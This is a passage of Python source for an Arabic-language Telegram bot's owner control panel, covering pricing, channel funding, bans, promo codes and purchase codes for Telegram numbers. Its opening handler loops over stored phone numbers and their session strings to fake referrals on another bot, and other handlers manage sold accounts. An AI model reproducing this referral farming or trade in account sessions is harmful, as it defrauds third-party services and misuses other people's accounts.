            await q.answer("✅ جميع الأرقام أكملت هذه الإحالة بالفعل!", show_alert=True)
            return
        await q.edit_message_text(
            f"⏳ جاري تشغيل مهمة الإحالة على {len(pending)} رقم...\n\n"
            f"سيصلك إشعار فور الانتهاء. هذا قد يستغرق بضع دقائق.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ref_tasks")]])
        )
        # تشغيل بالخلفية كي لا يتجمد البوت
        async def _run_task_bg():
            done = failed = 0
            for num in pending:
                success, detail = await do_referral_for_number(
                    num["phone_number"], num["session_string"],
                    task["bot_username"], task["start_param"]
                )
                mark_referral_completion(task_id, num["id"],
                                         "done" if success else "failed",
                                         None if success else detail)
                if success:
                    done += 1
                else:
                    failed += 1
                await asyncio.sleep(2)
            try:
                await context.bot.send_message(
                    OWNER_ID,
                    f"🤝 *انتهت مهمة إحالة: {task['label']}*\n\n"
                    f"✅ نجحت: {done} رقم\n❌ فشلت: {failed} رقم",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass
        asyncio.create_task(_run_task_bg())
        return

    if data.startswith("os:ref_delete:") and is_own:
        task_id = int(data.split(":")[-1])
        task = get_referral_task(task_id)
        if task:
            delete_referral_task(task_id)
        await q.edit_message_text(
            f"🗑 تم حذف مهمة الإحالة *{task['label'] if task else ''}* بنجاح.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ref_tasks")]])
        )
        return

    if data == "os:edit_number_cost" and is_own:
        context.user_data["state"] = "os_await_number_cost"
        cur = get_setting("telegram_number_cost") or "5000"
        await q.edit_message_text(f"📱 سعر رقم تيلغرام الحالي: {cur} نقطة\n\nأرسل القيمة الجديدة:")
        return

    # ─── إعدادات النجوم للاشتراك الإجباري ───
    if data == "os:edit_mstars_min" and is_own:
        cur = get_setting("mandatory_stars_min_members") or "50"
        context.user_data["state"] = "os_await_mstars_min"
        await q.edit_message_text(
            f"⭐ *الحد الأدنى للأعضاء — التمويل الإجباري بالنجوم*\n\n"
            f"القيمة الحالية: {cur} عضو\n\nأرسل القيمة الجديدة:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_mstars_t1max" and is_own:
        cur = get_setting("mandatory_stars_tier1_max") or "120"
        context.user_data["state"] = "os_await_mstars_t1max"
        await q.edit_message_text(
            f"⭐ *الحد الأعلى للشريحة 1 — التمويل الإجباري*\n\n"
            f"القيمة الحالية: {cur} عضو\n"
            f"(أعضاء ≤ هذا الحد يدفعون سعر الشريحة 1)\n\nأرسل القيمة الجديدة:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_mstars_t1p" and is_own:
        cur = int(get_setting("mandatory_stars_tier1_price_x100") or "50")
        context.user_data["state"] = "os_await_mstars_t1p"
        await q.edit_message_text(
            f"⭐ *سعر الشريحة 1 (مضروباً × 100)*\n\n"
            f"القيمة الحالية: {cur} (= {cur/100:.2f} نجمة/عضو)\n"
            f"مثال: 50 = 0.50 نجمة لكل عضو\n\nأرسل القيمة الجديدة:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_mstars_t2p" and is_own:
        cur = int(get_setting("mandatory_stars_tier2_price_x100") or "33")
        context.user_data["state"] = "os_await_mstars_t2p"
        await q.edit_message_text(
            f"⭐ *سعر الشريحة 2 (مضروباً × 100)*\n\n"
            f"القيمة الحالية: {cur} (= {cur/100:.2f} نجمة/عضو)\n"
            f"مثال: 33 = 0.33 نجمة لكل عضو\n\nأرسل القيمة الجديدة:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_leave_grace" and is_own:
        cur = get_setting("internal_leave_grace_hours") or "24"
        context.user_data["state"] = "os_await_leave_grace"
        await q.edit_message_text(
            f"⏱ *مهلة المغادرة الآمنة — القنوات الداخلية*\n\n"
            f"القيمة الحالية: {cur} ساعة\n"
            f"(المستخدم يُعاقب فقط إذا غادر خلال هذه المدة)\n\nأرسل القيمة الجديدة بالساعات:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:sold_search" and is_own:
        context.user_data["state"] = "os_await_sold_search"
        await q.edit_message_text(
            "🔍 *البحث في الحسابات المبيوعة*\n\nأرسل رقم الهاتف أو جزءاً منه:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:phone_search" and is_own:
        context.user_data["state"] = "os_await_phone_search"
        await q.edit_message_text(
            "🔎 *بحث برقم هاتف*\n\n"
            "أرسل رقم الهاتف أو جزءاً منه وسأجلب لك جميع المعلومات عنه،\n"
            "سواء كان مباعاً أو متاحاً أو محذوفاً:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:manage_numbers")]]))
        return

    if data == "os:sold_code_search" and is_own:
        context.user_data["state"] = "os_await_sold_code_search"
        await q.edit_message_text(
            "🧾 *التحقق بكود الطلب*\n\nأرسل كود الطلب للتحقق منه:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_contact" and is_own:
        context.user_data["state"] = "os_await_contact"
        cur = get_setting("owner_contact") or "غير مضبوط"
        cur_label = get_setting("owner_contact_label") or "💬 تواصل مع المالك"
        await q.edit_message_text(
            f"💬 *رابط تواصل المالك*\n\n"
            f"الرابط الحالي: {cur}\n"
            f"نص الزر الحالي: {cur_label}\n\n"
            f"أرسل رابط تيلغرام الخاص بك:\n"
            f"مثال: `https://t.me/username`\n\n"
            f"(أرسل *حذف* لإزالة الرابط)",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_contact_label" and is_own:
        context.user_data["state"] = "os_await_contact_label"
        cur_label = get_setting("owner_contact_label") or "💬 تواصل مع المالك"
        await q.edit_message_text(
            f"✏️ *نص زر التواصل (بعد خصم النقاط)*\n\n"
            f"النص الحالي: {cur_label}\n\n"
            f"أرسل النص الجديد للزر:\n"
            f"مثال: `- الدعم الفني 🧑‍🔧 -`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_support_label" and is_own:
        context.user_data["state"] = "os_await_support_label"
        cur_label = get_setting("support_contact_label") or "🛎 تواصل مع الدعم"
        await q.edit_message_text(
            f"✏️ *نص زر الدعم داخل صفحة التواصل*\n\n"
            f"النص الحالي: {cur_label}\n\n"
            f"أرسل النص الجديد:\n"
            f"مثال: `- الدعم الفني 🧑‍🔧 -`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_welcome" and is_own:
        context.user_data["state"] = "os_await_welcome"
        cur = get_setting("welcome_message") or ""
        await q.edit_message_text(f"💌 رسالة الترحيب الحالية:\n{cur}\n\nأرسل الرسالة الجديدة:")
        return

    if data == "os:edit_asiacell" and is_own:
        context.user_data["state"] = "os_await_asiacell_text"
        cur = get_setting("asiacell_text") or ""
        await q.edit_message_text(f"📲 النص الحالي لاسيا سيل:\n\n{cur}\n\nأرسل النص الجديد:")
        return

    if data == "os:edit_join_reward" and is_own:
        cur = get_setting("join_channel_reward") or "45"
        context.user_data["state"] = "os_await_join_reward"
        await q.edit_message_text(
            f"🎁 *نقاط الانضمام للقنوات الداخلية*\n\n"
            f"القيمة الحالية: {cur} نقطة\n\n"
            f"أرسل عدد النقاط التي يحصل عليها العضو عند الانضمام:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_leave_penalty" and is_own:
        cur = get_setting("channel_leave_penalty") or "75"
        context.user_data["state"] = "os_await_leave_penalty"
        await q.edit_message_text(
            f"❌ *خصم مغادرة القناة*\n\n"
            f"القيمة الحالية: {cur} نقطة\n\n"
            f"عند مغادرة العضو لقناة داخلية حصل منها على نقاط انضمام سابقاً، تُخصم منه هذه القيمة تلقائياً.\n"
            f"أرسل عدد النقاط الجديد:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_mandatory_min" and is_own:
        cur = get_setting("mandatory_channel_min_members") or "0"
        context.user_data["state"] = "os_await_mandatory_min"
        await q.edit_message_text(
            f"👥 *الحد الأدنى للأعضاء — التمويل الإجباري*\n\n"
            f"القيمة الحالية: {int(cur):,} عضو\n"
            f"(0 = بدون حد أدنى)\n\n"
            f"أرسل العدد الجديد:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_internal_min" and is_own:
        cur = get_setting("internal_channel_min_members") or "0"
        context.user_data["state"] = "os_await_internal_min"
        await q.edit_message_text(
            f"👥 *الحد الأدنى للأعضاء — التمويل الداخلي*\n\n"
            f"القيمة الحالية: {int(cur):,} عضو\n"
            f"(0 = بدون حد أدنى)\n\n"
            f"أرسل العدد الجديد:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_mandatory_cost" and is_own:
        cur = get_setting("mandatory_channel_cost") or "200"
        context.user_data["state"] = "os_await_mandatory_cost"
        await q.edit_message_text(
            f"📢 *سعر تمويل القناة الإجباري السريع*\n\n"
            f"السعر الحالي: {cur} نقطة\n\n"
            f"أرسل السعر الجديد بالنقاط:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:edit_internal_cost" and is_own:
        cur = get_setting("internal_channel_cost") or "100"
        context.user_data["state"] = "os_await_internal_cost"
        await q.edit_message_text(
            f"🔄 *سعر تمويل القناة الداخلي البطيء*\n\n"
            f"السعر الحالي: {cur} نقطة\n\n"
            f"أرسل السعر الجديد بالنقاط:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:cancel_order" and is_own:
        context.user_data["state"] = "os_await_cancel_order"
        await q.edit_message_text("❌ *إلغاء طلب:*\n\nأرسل كود الطلب المراد إلغاؤه:", parse_mode=ParseMode.MARKDOWN)
        return

    if data == "os:complete_order" and is_own:
        context.user_data["state"] = "os_await_complete_order"
        await q.edit_message_text("✅ *إكمال طلب:*\n\nأرسل كود الطلب الذي تم تنفيذه بالكامل:", parse_mode=ParseMode.MARKDOWN)
        return

    if data == "os:manage_channels" and is_own:
        context.user_data["state"] = "os_await_channel"
        with db_conn() as c:
            channels = c.execute(
                "SELECT * FROM mandatory_channels WHERE active=1 OR queued=1 ORDER BY queued ASC, id ASC"
            ).fetchall()
            fundings = {}
            for ch in channels:
                f = c.execute(
                    "SELECT current_members, target_members FROM channel_funding "
                    "WHERE channel_username=%s AND status='active' ORDER BY id DESC LIMIT 1",
                    (ch["channel_username"],)
                ).fetchone()
                if f:
                    fundings[ch["channel_username"]] = f
        if channels:
            lines = ["📡 *القنوات الحالية:*\n"]
            for ch in channels:
                tag = " ⏳ قيد الانتظار" if ch["queued"] else ""
                f = fundings.get(ch["channel_username"])
                progress = f" — {f['current_members']}/{f['target_members']}" if f else ""
                lines.append(f"• @{md_escape(ch['channel_username'])} ({md_escape(ch['funding_type'])}){progress}{tag}")
        else:
            lines = ["📡 لا توجد قنوات مضافة حالياً."]
        rows = []
        for ch in channels:
            rows.append([InlineKeyboardButton(
                f"❌ حذف @{ch['channel_username']}",
                callback_data=f"os_del_ch:{ch['id']}"
            )])
        rows.append([InlineKeyboardButton("➕ إضافة قناة", callback_data="os_add_ch")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        await q.edit_message_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN,
                                   reply_markup=InlineKeyboardMarkup(rows))
        return

    if data.startswith("os_del_ch:") and is_own:
        ch_id = int(data.split(":")[1])
        with db_conn() as c:
            _deleted_ch = c.execute("SELECT funding_type FROM mandatory_channels WHERE id=?", (ch_id,)).fetchone()
            c.execute("UPDATE mandatory_channels SET active=0, queued=0 WHERE id=?", (ch_id,))
        if _deleted_ch and _deleted_ch.get("funding_type") == "mandatory":
            await promote_queued_mandatory_channel(context, app=context.application)
        await q.answer("🗑 تم حذف القناة")
        return

    if data == "os_add_ch" and is_own:
        context.user_data["state"] = "os_await_channel"
        await q.edit_message_text("📡 أرسل يوزرنيم القناة (مثال: @channel):")
        return

    # ── قائمة إدارة الحظر (مالك) ──
    if data == "os:ban_menu" and is_own:
        with db_conn() as c:
            banned_count = c.execute("SELECT COUNT(*) as cnt FROM users WHERE banned=1").fetchone()["cnt"]
        await q.edit_message_text(
            f"🚫 *إدارة الحظر*\n\nعدد الأعضاء المحظورين حالياً: *{banned_count}*\n\n"
            "اختر الإجراء:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚫 حظر عضو (ID أو @يوزر)", callback_data="os:ban_member")],
                [InlineKeyboardButton("🔓 رفع حظر عضو", callback_data="os:unban_member")],
                [InlineKeyboardButton("📋 قائمة المحظورين", callback_data="os:list_banned")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")],
            ]),
        )
        return

    if data == "os:ban_member" and is_own:
        context.user_data["state"] = "os_await_ban_target"
        await q.edit_message_text(
            "🚫 *حظر عضو*\n\nأرسل الـ ID الرقمي للعضو أو @يوزرنيم:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:ban_menu")]]),
        )
        return

    if data == "os:unban_member" and is_own:
        context.user_data["state"] = "os_await_unban_target"
        await q.edit_message_text(
            "🔓 *رفع حظر عضو*\n\nأرسل الـ ID الرقمي للعضو أو @يوزرنيم:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:ban_menu")]]),
        )
        return

    if data.startswith("os:unban_confirm:") and is_own:
        target_id = int(data.split(":")[-1])
        found = unban_user_db(target_id)
        target = get_user(target_id)
        if found and target:
            uname = f"@{target['username']}" if target.get("username") else f"ID: {target_id}"
            await q.edit_message_text(
                f"✅ *تم رفع الحظر عن:* {target.get('full_name', '')} ({uname})",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ban_menu")]]),
            )
        else:
            await q.answer("⚠️ لم يُوجد المستخدم.", show_alert=True)
        return

    if data == "os:list_banned" and is_own:
        try:
            with db_conn() as c:
                banned = c.execute(
                    "SELECT user_id, username, full_name, banned_at, ban_reason FROM users "
                    "WHERE banned=1 ORDER BY banned_at DESC NULLS LAST LIMIT 50"
                ).fetchall()
            if not banned:
                await q.edit_message_text(
                    "📋 لا يوجد أعضاء محظورون حالياً.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ban_menu")]]),
                )
                return
            lines = ["🚫 *الأعضاء المحظورون:*\n"]
            kb_rows = []
            for b in banned:
                uname = f"@{md_escape(b['username'])}" if b["username"] else f"ID: {b['user_id']}"
                ts_raw = b["banned_at"]
                ts = ts_raw.strftime("%Y-%m-%d %H:%M") if ts_raw and hasattr(ts_raw, "strftime") else (str(ts_raw)[:16] if ts_raw else "—")
                reason = md_escape(b["ban_reason"] or "—")
                fname  = md_escape(b["full_name"] or "—")
                lines.append(f"• {fname} ({uname})\n  📝 {reason} | 🕐 {ts}")
                kb_rows.append([InlineKeyboardButton(
                    f"🔓 رفع حظر {uname}",
                    callback_data=f"os:unban_confirm:{b['user_id']}"
                )])
            kb_rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:ban_menu")])
            # تأكد أن النص لا يتجاوز 4096 حرفاً
            full_text = "\n".join(lines)
            if len(full_text) > 4000:
                full_text = full_text[:4000] + "\n\n⚠️ القائمة طويلة، تم اقتصارها."
            await q.edit_message_text(
                full_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(kb_rows),
            )
        except Exception as _e:
            logger.error(f"❌ os:list_banned error: {_e}")
            await q.answer(f"❌ خطأ: {_e}", show_alert=True)
        return

    # ── الأكواد الترويجية (مالك) ──
    if data == "os:create_promo" and is_own:
        context.user_data["state"] = "os_await_promo_code_text"
        await q.edit_message_text(
            "🎟 *إنشاء كود ترويجي جديد*\n\nأرسل الكود المراد إنشاؤه (أحرف وأرقام فقط):",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:list_promos" and is_own:
        with db_conn() as c:
            promos = c.execute("SELECT * FROM promo_codes ORDER BY created_at DESC").fetchall()
        if not promos:
            await q.edit_message_text("📋 لا توجد أكواد ترويجية.", reply_markup=owner_settings_kb())
            return
        lines = ["📋 *الأكواد الترويجية:*\n"]
        rows  = []
        for p in promos:
            status = "✅" if p["active"] else "❌"
            lines.append(
                f"{status} `{p['code']}` — {p['points']} نقطة — {p['used_count']}/{p['max_uses']} استخدام"
            )
            tog = "❌ تعطيل" if p["active"] else "✅ تفعيل"
            rows.append([
                InlineKeyboardButton(f"👥 {p['code']}", callback_data=f"os:promo_users:{p['code']}"),
                InlineKeyboardButton(tog, callback_data=f"os_tog_promo:{p['code']}:{0 if p['active'] else 1}"),
                InlineKeyboardButton("🗑", callback_data=f"os_del_promo:{p['code']}")
            ])
        rows.append([InlineKeyboardButton("🔍 بحث عن كود (حتى القديمة)", callback_data="os:search_code")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        await q.edit_message_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN,
                                   reply_markup=InlineKeyboardMarkup(rows))
        return

    if data == "os:search_code" and is_own:
        context.user_data["state"] = "os_await_code_search"
        await q.edit_message_text(
            "🔍 *البحث عن مستخدمي كود*\n\n"
            "أرسل نص الكود (يعمل حتى للأكواد القديمة المحذوفة):",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="owner_settings")]]),
        )
        return

    if data.startswith("os:promo_users:") and is_own:
        code = data[len("os:promo_users:"):]
        try:
            with db_conn() as c:
                promo = c.execute("SELECT * FROM promo_codes WHERE code=%s", (code,)).fetchone()
            with db_conn() as c:
                uses = c.execute(
                    """
                    SELECT pu.user_id, pu.used_at,
                           u.username, u.full_name, u.points
                    FROM promo_uses pu
                    LEFT JOIN users u ON u.user_id = pu.user_id
                    WHERE pu.code = %s
                    ORDER BY pu.used_at DESC NULLS LAST
                    """,
                    (code,)
                ).fetchall()
            if not promo:
                await q.answer("⚠️ الكود غير موجود", show_alert=True)
                return
            header = (
                f"👥 *من استخدم الكود:* `{code}`\n"
                f"🎁 النقاط: {promo['points']} | الاستخدامات: {promo['used_count']}/{promo['max_uses']}\n"
            )
            if not uses:
                body = "\n_لم يستخدمه أحد بعد._"
            else:
                lines = []
                for i, u in enumerate(uses, 1):
                    name  = md_escape((u["full_name"] or "").strip() or "—")
                    uname = f"@{md_escape(u['username'])}" if u["username"] else f"ID: {u['user_id']}"
                    pts   = u["points"] if u["points"] is not None else "؟"
                    ts_raw = u["used_at"]
                    if ts_raw:
                        if hasattr(ts_raw, "strftime"):
                            ts = ts_raw.strftime("%Y-%m-%d %H:%M")
                        else:
                            ts = str(ts_raw)[:16]
                    else:
                        ts = "—"
                    lines.append(
                        f"{i}. {name} ({uname})\n"
                        f"   💰 رصيده: {pts} نقطة | 🕐 {ts}"
                    )
                body = "\n\n" + "\n\n".join(lines)
            full_text = header + body
            if len(full_text) > 4000:
                full_text = full_text[:4000] + "\n\n⚠️ القائمة طويلة، تم اقتصارها."
            await q.edit_message_text(
                full_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 رجوع للأكواد", callback_data="os:list_promos")]
                ])
            )
        except Exception as _e:
            logger.error(f"❌ os:promo_users error: {_e}")
            await q.answer(f"❌ خطأ: {_e}", show_alert=True)
        return

    if data.startswith("os_tog_promo:") and is_own:
        parts = data.split(":")
        code  = parts[1]
        val   = int(parts[2])
        with db_conn() as c:
            c.execute("UPDATE promo_codes SET active=? WHERE code=?", (val, code))
        await q.answer("✅ تم التحديث")
        return

    if data.startswith("os_del_promo:") and is_own:
        code = data.split(":")[1]
        with db_conn() as c:
            c.execute("DELETE FROM promo_codes WHERE code=?", (code,))
        await q.answer("🗑 تم الحذف")
        return

    # ── منح / خصم نقاط (مالك) ──
    if data == "os:manage_points" and is_own:
        await q.edit_message_text(
            "💰 *منح / خصم نقاط*\n\nاختر العملية:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ منح نقاط لعضو", callback_data="os:give_points")],
                [InlineKeyboardButton("➖ خصم نقاط من عضو", callback_data="os:deduct_points")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")],
            ])
        )
        return

    if data == "os:give_points" and is_own:
        context.user_data["state"]       = "os_await_points_target"
        context.user_data["points_mode"] = "give"
        await q.edit_message_text(
            "➕ *منح نقاط*\n\nأرسل ID المستخدم أو @يوزرنيم:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:manage_points")]])
        )
        return

    if data == "os:deduct_points" and is_own:
        context.user_data["state"]       = "os_await_points_target"
        context.user_data["points_mode"] = "deduct"
        await q.edit_message_text(
            "➖ *خصم نقاط*\n\nأرسل ID المستخدم أو @يوزرنيم:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:manage_points")]])
        )
        return

    # ── رسالة جماعية ──
    if data == "os:broadcast" and is_own:
        context.user_data["state"] = "os_await_broadcast"
        with db_conn() as c:
            total = c.execute("SELECT COUNT(*) as cnt FROM users").fetchone()["cnt"]
        await q.edit_message_text(
            f"📢 *رسالة جماعية*\n\n"
            f"سيتم الإرسال لـ {total} مستخدم.\n\n"
            f"أرسل الرسالة الآن (يدعم HTML):",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "os:toggle_captcha" and is_own:
        current = int(get_setting("captcha_enabled") or "0")
        new_val = "0" if current else "1"
        set_setting("captcha_enabled", new_val)
        status = "مفعّل ✅" if new_val == "1" else "معطّل ❌"
        await q.edit_message_text(
            f"🔐 *التحقق الرياضي الآن: {status}*\n\n"
            f"{'سيظهر السؤال للمستخدمين الجدد عند /start' if new_val == '1' else 'لن يظهر أي سؤال للمستخدمين الجدد'}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    if data == "os:toggle_maintenance" and is_own:
        current = int(get_setting("maintenance_mode") or "0")
        new_val = "0" if current else "1"
        set_setting("maintenance_mode", new_val)
        status = "مفعّل 🛠" if new_val == "1" else "معطّل ✅"
        await q.edit_message_text(
            f"🛠 *وضع الصيانة الآن: {status}*\n\n"
            f"{'سيشاهد جميع الأعضاء (عدا المالك) رسالة الصيانة بدل البوت.' if new_val == '1' else 'البوت يعمل بشكل طبيعي لجميع الأعضاء.'}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    if data == "os:manage_num_codes" and is_own:
        with db_conn() as c:
            ncodes = c.execute(
                "SELECT code, max_uses, used_count, active FROM number_purchase_codes ORDER BY created_at DESC LIMIT 20"
            ).fetchall()
        rows = []
        if ncodes:
            for nc in ncodes:
                status = "✅" if nc["active"] else "❌"
                rows.append([InlineKeyboardButton(
                    f"{status} {nc['code']} ({nc['used_count']}/{nc['max_uses']})",
                    callback_data=f"os:num_code_info:{nc['code']}"
                )])
        rows.append([InlineKeyboardButton("➕ إنشاء كود شراء جديد", callback_data="os:create_num_code")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:back_settings")])
        await q.edit_message_text(
            "🎟 *أكواد شراء رقم تيلغرام*\n\n"
            "كل كود يُتيح للمستخدم شراء رقم تيلغرام بدون نقاط.\n"
            "يمكنك تحديد عدد مرات الاستخدام لكل كود.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data == "os:create_num_code" and is_own:
        context.user_data["state"] = "os_await_num_code_text"
        await q.edit_message_text(
            "🎟 *إنشاء كود شراء رقم جديد*\n\nأرسل الكود المطلوب (حروف وأرقام فقط):",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data.startswith("os:num_code_info:") and is_own:
        nc_code = data[len("os:num_code_info:"):]
        with db_conn() as c:
            nc = c.execute("SELECT * FROM number_purchase_codes WHERE code=%s", (nc_code,)).fetchone()
        if not nc:
            await q.answer("⚠️ الكود غير موجود.", show_alert=True)
            return
        status = "✅ فعّال" if nc["active"] else "❌ معطّل"
        toggle_label = "❌ تعطيل الكود" if nc["active"] else "✅ تفعيل الكود"
        rows = [
            [InlineKeyboardButton(f"👥 من استخدم الكود ({nc['used_count']})", callback_data=f"os:num_code_users:{nc_code}")],
            [InlineKeyboardButton(toggle_label, callback_data=f"os:toggle_num_code:{nc_code}")],
            [InlineKeyboardButton("🗑 حذف الكود", callback_data=f"os:del_num_code:{nc_code}")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_num_codes")],
        ]
        await q.edit_message_text(
            f"🎟 *كود شراء رقم*\n\n"
            f"الكود: `{nc_code}`\n"
            f"الحالة: {status}\n"
            f"مرات الاستخدام: {nc['used_count']}/{nc['max_uses']}\n"
            f"تاريخ الإنشاء: {nc['created_at']}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("os:num_code_users:") and is_own:
        nc_code = data[len("os:num_code_users:"):]
        try:
            with db_conn() as c:
                nc = c.execute("SELECT * FROM number_purchase_codes WHERE code=%s", (nc_code,)).fetchone()
                uses = c.execute(
                    """
                    SELECT ncu.user_id, ncu.used_at,
                           u.username, u.full_name, u.points,
                           pe.prize_value AS number_given
                    FROM number_purchase_code_uses ncu
                    LEFT JOIN users u ON u.user_id = ncu.user_id
                    LEFT JOIN prize_exchanges pe ON pe.user_id = ncu.user_id
                         AND pe.prize_type = 'telegram_number_code'
                         AND pe.status = 'completed'
                    WHERE ncu.code = %s
                    ORDER BY ncu.used_at DESC NULLS LAST
                    """,
                    (nc_code,)
                ).fetchall()
            if nc:
                header = (
                    f"👥 *من استخدم كود شراء الرقم:* `{nc_code}`\n"
                    f"الاستخدامات: {nc['used_count']}/{nc['max_uses']} | "
                    f"{'✅ فعّال' if nc['active'] else '❌ معطّل'}\n\n"
                )
            else:
                header = f"👥 *من استخدم الكود (قديم):* `{nc_code}`\n\n"
            if not uses:
                body = "_لم يستخدمه أحد بعد._"
            else:
                lines = []
                for i, u in enumerate(uses, 1):
                    name  = md_escape((u["full_name"] or "").strip() or "—")
                    uname = f"@{md_escape(u['username'])}" if u["username"] else f"ID: {u['user_id']}"
                    num   = u["number_given"] or "—"
                    ts_raw = u["used_at"]
                    ts = ts_raw.strftime("%Y-%m-%d %H:%M") if ts_raw and hasattr(ts_raw, "strftime") else (str(ts_raw)[:16] if ts_raw else "—")
                    lines.append(
                        f"{i}. {name} ({uname})\n"
                        f"   📱 الرقم المسلَّم: `{num}`\n"
                        f"   🕐 {ts}"
                    )
                body = "\n\n".join(lines)
            full_text = header + body
            if len(full_text) > 4000:
                full_text = full_text[:3950] + "\n\n⚠️ القائمة طويلة، تم اقتصارها."
            await q.edit_message_text(
                full_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 رجوع للكود", callback_data=f"os:num_code_info:{nc_code}")]
                ])
            )
        except Exception as _e:
            logger.error(f"❌ os:num_code_users error: {_e}")
            await q.answer(f"❌ خطأ: {_e}", show_alert=True)
        return

    if data.startswith("os:toggle_num_code:") and is_own:
        nc_code = data[len("os:toggle_num_code:"):]
        with db_conn() as c:
            nc = c.execute("SELECT active FROM number_purchase_codes WHERE code=%s", (nc_code,)).fetchone()
            if nc:
                new_active = 0 if nc["active"] else 1
                c.execute("UPDATE number_purchase_codes SET active=%s WHERE code=%s", (new_active, nc_code))
        await q.answer("✅ تم تحديث حالة الكود.", show_alert=False)
        # إعادة عرض المعلومات
        with db_conn() as c:
            nc2 = c.execute("SELECT * FROM number_purchase_codes WHERE code=%s", (nc_code,)).fetchone()
        status = "✅ فعّال" if nc2["active"] else "❌ معطّل"
        toggle_label = "❌ تعطيل الكود" if nc2["active"] else "✅ تفعيل الكود"
        rows = [
            [InlineKeyboardButton(f"👥 من استخدم الكود ({nc2['used_count']})", callback_data=f"os:num_code_users:{nc_code}")],
            [InlineKeyboardButton(toggle_label, callback_data=f"os:toggle_num_code:{nc_code}")],
            [InlineKeyboardButton("🗑 حذف الكود", callback_data=f"os:del_num_code:{nc_code}")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_num_codes")],
        ]
        await q.edit_message_text(
            f"🎟 *كود شراء رقم*\n\n"
            f"الكود: `{nc_code}`\n"
            f"الحالة: {status}\n"
            f"مرات الاستخدام: {nc2['used_count']}/{nc2['max_uses']}\n"
            f"تاريخ الإنشاء: {nc2['created_at']}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("os:del_num_code:") and is_own:
        nc_code = data[len("os:del_num_code:"):]
        with db_conn() as c:
            c.execute("DELETE FROM number_purchase_codes WHERE code=%s", (nc_code,))
            c.execute("DELETE FROM number_purchase_code_uses WHERE code=%s", (nc_code,))
        await q.edit_message_text(
            f"✅ تم حذف الكود `{nc_code}` بنجاح.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_kb("os:manage_num_codes")
        )
        return

    if data == "os:toggle_number_exchange" and is_own:
        current = int(get_setting("number_exchange_enabled") or "0")
        new_val = "0" if current else "1"
        set_setting("number_exchange_enabled", new_val)
        status = "مفعّل ✅" if new_val == "1" else "مغلق ❌"
        await q.edit_message_text(
